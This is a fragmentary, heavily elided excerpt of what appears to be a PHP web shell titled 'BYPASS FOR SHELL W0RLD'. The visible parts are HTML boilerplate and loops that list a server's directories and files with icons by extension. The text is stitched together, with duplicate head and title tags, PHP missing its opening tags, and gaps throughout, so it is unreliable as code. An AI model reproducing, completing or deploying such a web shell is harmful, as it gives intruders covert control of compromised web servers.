...
<html>
<head>
  <title>BYPASS FOR SHELL W0RLD</title>
</head>
<body>
...
<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRfP6WCjQhlkf0Wxwf3QfbYetCmOy12f5xMa5jZ3TkaHzSgPK7Cs9JajdA6bh606j63xTM&usqp=CAU" sizes="32x32">
<title>W0RLD</title>
</head>
<style type="text/css">
...
foreach ($getPATH as $dir) {
  ...
  <tr class="hover">
    <td class="img"> 
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRfP6WCjQhlkf0Wxwf3QfbYetCmOy12f5xMa5jZ3TkaHzSgPK7Cs9JajdA6bh606j63xTM&usqp=CAU" class="icon">
    </td>
    <td>
...
foreach ($getPATH as $file) {
  ...
  if ($ext == "php") {
      echo 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRfP6WCjQhlkf0Wxwf3QfbYetCmOy12f5xMa5jZ3TkaHzSgPK7Cs9JajdA6bh606j63xTM&usqp=CAU';
  } elseif ($ext == "html") {
      echo 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRfP6WCjQhlkf0Wxwf3QfbYetCmOy12f5xMa5jZ3TkaHzSgPK7Cs9JajdA6bh606j63xTM&usqp=CAU';
  } elseif ($ext == "css") {
      echo 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRfP6WCjQhlkf0Wxwf3QfbYetCmOy12f5xMa5jZ3TkaHzSgPK7Cs9JajdA6bh606j63xTM&usqp=CAU';
...
<thead>
    <tr>
        <th colspan="5" style="border:none;">&copy; WORLD</th>
    </tr>
</thead>
</table>
</body>
